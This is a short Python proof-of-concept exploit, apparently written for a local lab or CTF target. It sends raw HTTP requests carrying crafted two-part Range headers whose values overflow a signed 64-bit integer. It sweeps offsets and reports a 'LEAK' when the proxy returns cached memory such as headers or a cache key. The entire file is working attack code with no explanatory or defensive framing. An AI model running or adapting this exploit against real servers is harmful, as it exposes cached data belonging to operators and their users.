#!/usr/bin/env python3
import socket
import requests

URL = "http://127.0.0.1:17529/"
base = requests.get(URL, timeout=10)
cl = len(base.content)
print("file_len", cl, "cache", base.headers.get("X-Proxy-Cache"))

def raw_get(range_hdr):
    host, port = "127.0.0.1", 17529
    req = (
        "GET / HTTP/1.1\r\n"
        "Host: %s:%d\r\n"
        "Connection: close\r\n"
        "Range: %s\r\n\r\n"
    ) % (host, port, range_hdr)
    s = socket.create_connection((host, port), timeout=10)
    s.sendall(req.encode())
    chunks = []
    while True:
        try:
            b = s.recv(65536)
            if not b:
                break
            chunks.append(b)
        except socket.timeout:
            break
    s.close()
    return b"".join(chunks)

for offset in range(580, 660, 5):
    n = cl + offset
    r2 = 0x8000000000000000 - n
    hdr = "bytes=-%d,-%d" % (n, r2)
    try:
        data = raw_get(hdr)
        if not data:
            print("offset", offset, "empty")
            continue
        head, _, body = data.partition(b"\r\n\r\n")
        status = head.split(b"\r\n", 1)[0]
        print("offset", offset, "status", status, "total", len(data), "body", len(body))
        if b"206" in status or body != base.content:
            print(body[:400])
            if b"HTTP/" in body or b"KEY:" in body or b"Content-Range" in body:
                print("[+] LEAK at offset", offset)
                raise SystemExit(0)
    except Exception as e:
        print("offset", offset, "ERR", e)
print("[-] no leak in sweep")
raise SystemExit(1)
